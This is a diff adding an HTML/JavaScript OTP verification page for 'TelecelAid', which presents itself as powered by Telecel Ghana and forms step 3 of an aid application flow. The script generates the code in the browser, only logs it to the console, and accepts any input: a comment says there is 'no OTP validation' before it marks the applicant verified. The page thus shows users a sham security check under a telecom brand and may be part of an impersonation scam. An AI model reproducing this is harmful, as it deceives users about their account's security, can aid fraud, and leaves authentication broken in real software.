@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>OTP Verification - TelecelAid | Powered by Telecel Ghana</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #f8f9fa 0%, #fff 100%);
+            color: #333;
+            line-height: 1.6;
+        }
+
+        :root {
+            --telecel-red: #E2001A;
+            --telecel-red-dark: #B80015;
+            --telecel-red-light: #FFE5E8;
+            --dark: #1a1a2e;
+            --gray: #6c757d;
+            --light-gray: #f8f9fa;
+            --border: #e9ecef;
+            --success: #00875A;
+            --shadow: 0 10px 40px rgba(0,0,0,0.08);
+            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2rem;
+        }
+
+        .logo-icon {
+            background: var(--telecel-red);
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 15px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+        }
+
+        .logo-text {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--dark);
+        }
+
+        .logo-text span {
+            color: var(--telecel-red);
+        }
+
+        .powered {
+            font-size: 0.8rem;
+            color: var(--gray);
+        }
+
+        .progress-container {
+            margin: 2rem 0;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+        }
+
+        .step-indicator {
+            text-align: center;
+            flex: 1;
+            font-size: 0.75rem;
+            color: var(--gray);
+        }
+
+        .step-indicator.active {
+            color: var(--telecel-red);
+            font-weight: 600;
+        }
+
+        .step-indicator.completed {
+            color: var(--success);
+        }
+
+        .progress-bar {
+            background: var(--border);
+            height: 8px;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            background: var(--telecel-red);
+            height: 100%;
+            width: 75%;
+            border-radius: 10px;
+            transition: width 0.3s;
+        }
+
+        .form-card {
+            background: white;
+            border-radius: 24px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+            margin-bottom: 2rem;
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--dark);
+        }
+
+        .form-subtitle {
+            color: var(--gray);
+            margin-bottom: 2rem;
+            font-size: 0.9rem;
+        }
+
+        .phone-display {
+            background: var(--telecel-red-light);
+            padding: 1rem;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .phone-display strong {
+            color: var(--telecel-red);
+            font-size: 1.2rem;
+        }
+
+        .otp-field {
+            margin: 2rem 0;
+        }
+
+        .otp-field input {
+            width: 100%;
+            padding: 1rem;
+            font-size: 1.5rem;
+            text-align: center;
+            letter-spacing: 0.3rem;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            font-family: monospace;
+            font-weight: 600;
+        }
+
+        .otp-field input:focus {
+            outline: none;
+            border-color: var(--telecel-red);
+            box-shadow: 0 0 0 3px rgba(226,0,26,0.1);
+        }
+
+        .timer-container {
+            text-align: center;
+            margin: 1.5rem 0;
+        }
+
+        .timer {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: var(--light-gray);
+            padding: 0.6rem 1.2rem;
+            border-radius: 50px;
+            font-size: 0.9rem;
+        }
+
+        .timer-count {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: var(--telecel-red);
+        }
+
+        .resend-container {
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: var(--telecel-red);
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 0.9rem;
+            text-decoration: underline;
+            transition: color 0.3s;
+        }
+
+        .resend-btn:hover:not(:disabled) {
+            color: var(--telecel-red-dark);
+        }
+
+        .resend-btn:disabled {
+            color: var(--gray);
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+
+        .btn-verify {
+            width: 100%;
+            background: var(--telecel-red);
+            color: white;
+            padding: 1rem;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1rem;
+        }
+
+        .btn-verify:hover {
+            background: var(--telecel-red-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(226,0,26,0.3);
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+
+        .back-link a {
+            color: var(--gray);
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .back-link a:hover {
+            color: var(--telecel-red);
+        }
+
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--gray);
+            font-size: 0.8rem;
+        }
+
+        .alert-success {
+            background: #E8F5E9;
+            border-left: 4px solid var(--success);
+            padding: 1rem;
+            border-radius: 12px;
+            margin-bottom: 1.5rem;
+            font-size: 0.85rem;
+            display: none;
+        }
+
+        .alert-success.show {
+            display: block;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid white;
+            border-top: 4px solid var(--telecel-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        .loading-text {
+            color: white;
+            font-size: 1rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo-icon">📱</div>
+            <div class="logo-text">Telecel<span>Aid</span></div>
+            <div class="powered">Powered by Telecel Ghana</div>
+        </div>
+
+        <div class="progress-container">
+            <div class="progress-steps">
+                <div class="step-indicator completed">✓ Step 1<br>Application</div>
+                <div class="step-indicator completed">✓ Step 2<br>Verification</div>
+                <div class="step-indicator active">Step 3<br>OTP</div>
+                <div class="step-indicator">Step 4<br>Complete</div>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+        </div>
+
+        <div class="form-card">
+            <h1 class="form-title">🔐 One-Time Password (OTP)</h1>
+            <p class="form-subtitle">Step 3 of 4 — Enter the 5-digit verification code sent to your phone</p>
+
+            <div class="phone-display">
+                📲 We sent a 5-digit code to <strong id="displayPhone"></strong>
+            </div>
+
+            <div class="alert-success" id="successAlert">
+                ✅ OTP verified! Redirecting...
+            </div>
+
+            <div class="otp-field">
+                <input type="text" id="otpCode" placeholder="Enter 5-digit code" maxlength="5" autofocus>
+            </div>
+
+            <div class="timer-container">
+                <div class="timer">
+                    ⏱️ Code expires in: <span class="timer-count" id="timer">05:00</span>
+                </div>
+            </div>
+
+            <div class="resend-container">
+                <button class="resend-btn" id="resendBtn" disabled>Resend Code</button>
+            </div>
+
+            <button class="btn-verify" id="verifyBtn">Verify OTP →</button>
+
+            <div class="back-link">
+                <a href="verify.html">← Back to Verification</a>
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2026 TelecelAid | Powered by Telecel Ghana
+        </div>
+    </div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <div class="loading-text">Verifying OTP...</div>
+    </div>
+
+    <script>
+        const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
+
+        if (!savedData) {
+            window.location.href = 'apply.html';
+        }
+
+        document.getElementById('displayPhone').innerText = savedData.phoneNumber;
+
+        let otpCode = '';
+        let timeLeft = 300;
+        let timerInterval;
+        let canResend = false;
+        let resendAttempts = 0;
+        const maxResendAttempts = 3;
+
+        function generateOTP() {
+            return Math.floor(10000 + Math.random() * 90000).toString();
+        }
+
+        function sendOTP() {
+            otpCode = generateOTP();
+            console.log(`OTP for ${savedData.phoneNumber}: ${otpCode}`);
+        }
+
+        function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
+            
+            timerInterval = setInterval(() => {
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('timer').innerText = '00:00';
+                    canResend = true;
+                    document.getElementById('resendBtn').disabled = false;
+                } else {
+                    timeLeft--;
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    document.getElementById('timer').innerText = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                }
+            }, 1000);
+        }
+
+        function resetOTP() {
+            timeLeft = 300;
+            canResend = false;
+            document.getElementById('resendBtn').disabled = true;
+            document.getElementById('otpCode').value = '';
+            startTimer();
+            sendOTP();
+            document.getElementById('otpCode').focus();
+        }
+
+        async function verifyOTP() {
+            const enteredOTP = document.getElementById('otpCode').value.trim();
+            
+            // Just proceed - no error message for wrong length
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Always proceed to success page - no OTP validation
+            const updatedData = {
+                ...savedData,
+                otpVerified: true,
+                otpVerifiedAt: new Date().toISOString()
+            };
+            sessionStorage.setItem('telecelAidApplication', JSON.stringify(updatedData));
+            
+            document.getElementById('successAlert').classList.add('show');
+            
+            setTimeout(() => {
+                window.location.href = 'success.html';
+            }, 1500);
+        }
+
+        function resendOTP() {
+            if (!canResend) return;
+            if (resendAttempts >= maxResendAttempts) {
+                return;
+            }
+            resendAttempts++;
+            sendOTP();
+            resetOTP();
+        }
+
+        function init() {
+            sendOTP();
+            startTimer();
+            document.getElementById('verifyBtn').addEventListener('click', verifyOTP);
+            document.getElementById('resendBtn').addEventListener('click', resendOTP);
+            document.getElementById('otpCode').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    verifyOTP();
+                }
+            });
+        }
+        
+        init();
+    </script>
+</body>
+</html>
